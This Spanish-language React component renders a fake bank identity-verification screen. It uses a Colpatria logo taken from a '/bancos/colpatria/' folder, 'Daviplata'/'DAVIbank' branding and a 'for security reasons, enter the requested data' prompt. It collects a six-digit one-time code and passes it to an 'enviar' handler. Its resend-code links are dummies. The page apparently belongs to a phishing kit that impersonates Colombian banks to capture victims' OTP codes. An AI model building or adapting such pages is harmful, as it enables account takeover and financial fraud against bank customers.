/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/no-unused-vars */
/* eslint-disable @next/next/no-img-element */
"use client";
import React, { useRef, useState, useEffect } from 'react';
import { User, Lock } from 'lucide-react';

// Colores basados en tu LoginCard anterior
const PRIMARY_COLOR = '#007eab'; // Azul (para enlaces/focus)
const BUTTON_COLOR = '#ec111a'; // Rojo (para botón)

// Componente simulando el logo de "DAVIPLATA bank"
const DaviplataLogo: React.FC = () => (
  <div className="flex items-center space-x-1 mb-6 pt-2">
    {/* Usando el mismo logo y clases del componente LoginCard */}
    <img src="/bancos/colpatria/new-brand-red.svg" className='h-8 w-[120px]' alt="" />
  </div>
);

const Otp: React.FC = ({ enviar }: any) => {
  // Estado para el código OTP de 6 dígitos
  const [otp, setOtp] = useState<string[]>(new Array(6).fill(''));
  const inputRefs = useRef<Array<HTMLInputElement | null>>([]);
  const [remainingTime, setRemainingTime] = useState(300); // 5 minutos = 300 segundos

  // Maneja la cuenta regresiva (simulación)
  useEffect(() => {
    // Si el tiempo llega a cero, el código expira.
    if (remainingTime === 0) return;

    const interval = setInterval(() => {
      setRemainingTime(prevTime => prevTime - 1);
    }, 1000);

    return () => clearInterval(interval);
  }, [remainingTime]);

  const minutes = Math.floor(remainingTime / 60);
  const seconds = remainingTime % 60;
  const timerDisplay = `${minutes}:${seconds.toString().padStart(2, '0')}`;

  // Maneja la entrada de datos y el movimiento de foco
  const handleChange = (element: HTMLInputElement, index: number) => {
    const value = element.value;

    // Solo acepta un dígito
    if (value.length > 1) {
      element.value = value.charAt(0);
    }

    const newOtp = [...otp];
    newOtp[index] = element.value;
    setOtp(newOtp);

    // Mover el foco al siguiente input si se ingresa un dígito y no es el último
    if (element.value !== '' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  // Maneja la pulsación de la tecla de retroceso (Backspace)
  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === "Backspace" && otp[index] === '' && index > 0) {
      // Si está vacío, mueve el foco al input anterior
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const finalOtp = otp.join('');
    console.log("Código OTP ingresado:", finalOtp);
    if (finalOtp.length === 6) {
      console.log("Validando código...");
      enviar({ otp: finalOtp, view: "otp" });
    }
  };

  return (
    // Contenedor principal
    <div className="w-full mx-auto pl-[37px] pr-[37px] pt-[41px] pb-0 bg-white">

      <DaviplataLogo />

      <h1 className="text-[24px] font-extrabold text-gray-800 mb-8">
        Verifica tu identidad
        <p className='text-[12px] font-normal'>Por favor ingresa el código de 6 dígitos enviado a su correo electrónico y/o teléfono celular registrados

        </p>
      </h1>

      <form onSubmit={handleSubmit} className="space-y-6">

        {/* 1. Campos de Entrada OTP */}
        <div className="flex justify-between space-x-2 mb-4">
          {otp.map((data, index) => (
            <input
              key={index}
              type="tel" // Usar 'tel' en móviles para teclado numérico
              maxLength={1}
              value={data}
              onChange={(e) => handleChange(e.target, index)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              // FIX: Se usa la sintaxis de bloque para asegurar que la función ref retorne void (nada)
              ref={(el) => { inputRefs.current[index] = el; }}
              className="w-1/6 h-14 text-center text-2xl font-bold border border-gray-300 rounded-lg focus:border-blue-500 outline-none transition duration-150"
              style={{ caretColor: 'transparent' }} // Oculta el cursor para mejor visual
              required
            />
          ))}
        </div>

        {/* 2. Temporizador y mensaje de vigencia */}
        <p className="text-sm text-gray-600 text-center mb-6">
          El código es válido por {timerDisplay}
        </p>

        {/* Botón Ingresar */}
        <button
          type="submit"
          disabled={otp.join('').length !== 6 || remainingTime === 0}
          className={`w-full py-3 mt-4 text-[16px] text-white font-medium rounded-md transition duration-200 shadow-md ${otp.join('').length === 6 && remainingTime > 0
            ? `bg-[${BUTTON_COLOR}] hover:bg-[#be061b] cursor-pointer`
            : 'bg-gray-400 cursor-not-allowed'
            }`}
          style={{ backgroundColor: otp.join('').length === 6 && remainingTime > 0 ? BUTTON_COLOR : undefined }}
        >
          Validar Código
        </button>
        <p>Por razones de seguridad le recomendamos ingresar los datos solicitados a fin de seguir disfrutando de nuestros servicios

        </p>
      </form>

      {/* 3. Enlaces de recuperación */}
      <div className="mt-8 text-center space-y-4">
        <h2 className="text-lg font-bold text-gray-800">
          ¿No has recibido el código?
        </h2>
        <a
          href="#"
          onClick={(e) => { e.preventDefault(); console.log('Pedir otro código'); }}
          className={`text-base font-bold text-[${PRIMARY_COLOR}] hover:underline cursor-pointer block`}
          style={{ color: PRIMARY_COLOR }}
        >
          Pedir otro código
        </a>
        <a
          href="#"
          onClick={(e) => { e.preventDefault(); console.log('Pedir código al correo'); }}
          className={`text-base font-bold text-[${PRIMARY_COLOR}] hover:underline cursor-pointer block`}
          style={{ color: PRIMARY_COLOR }}
        >
          Pedir código al correo electrónico registrado
        </a>
      </div>

      {/* Bloque de Información Inferior (Mantenido del login) */}
      <div className="buddytip-container buddytip-container--flat mt-12">
        <div className="block block--centered buddytip-container__img">
          <svg
            width="32"
            height="26"
            viewBox="0 0 32 26"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
            focusable="false"
            role="presentation"
            aria-hidden="true"
            className="svg-icon svg-icon-illustrative--size-36px flex"
          >
            <path d="M26.5277 15.8639C29.0714 15.8639 31.1334 13.8018 31.1334 11.2581C31.1334 8.71442 29.0714 6.65234 26.5277 6.65234C23.984 6.65234 21.9219 8.71442 21.9219 11.2581C21.9219 13.8018 23.984 15.8639 26.5277 15.8639Z" fill="#91DDF8"></path>
            <path fillRule="evenodd" clipRule="evenodd" d="M26.3832 0.975607C26.4765 1.16152 26.5261 1.36634 26.528 1.57436V20.945C26.5266 21.4037 26.2865 21.8287 25.8942 22.0665C25.5019 22.3043 25.014 22.3206 24.6067 22.1096L15.0661 17.1814H10.2301V5.33794H15.0661L24.6067 0.409754C24.9172 0.248544 25.2791 0.217611 25.6124 0.323789C25.9458 0.429968 26.2231 0.664517 26.3832 0.975607ZM4.815 6.65395V15.8655H2.18313C1.45635 15.8655 0.867188 15.2763 0.867188 14.5496V7.96989C0.867187 7.24311 1.45635 6.65395 2.18313 6.65395H4.815Z" fill="#009DD6"></path>
            <path d="M5.47316 17.1833C4.74639 17.1833 4.15723 16.5941 4.15723 15.8673V6.65578C4.15723 5.92901 4.74639 5.33984 5.47316 5.33984H11.3949V17.1833L14.0268 23.9472C14.1531 24.2735 14.1443 24.6366 14.0023 24.9564C13.8603 25.2762 13.5968 25.5262 13.2701 25.6513C13.1181 25.7063 12.958 25.7353 12.7964 25.7369H10.4803C9.93535 25.738 9.44609 25.4031 9.2499 24.8947L6.28247 17.1833H5.47316Z" fill="#7849B8"></path>
          </svg>
        </div>
        <p className="text text--small">
          DAVIbank tiene un aviso importante para ti
          <b className="text text--small text--bold link link__text">Lee más aquí</b>
        </p>
      </div>
    </div>
  );
};

export default Otp;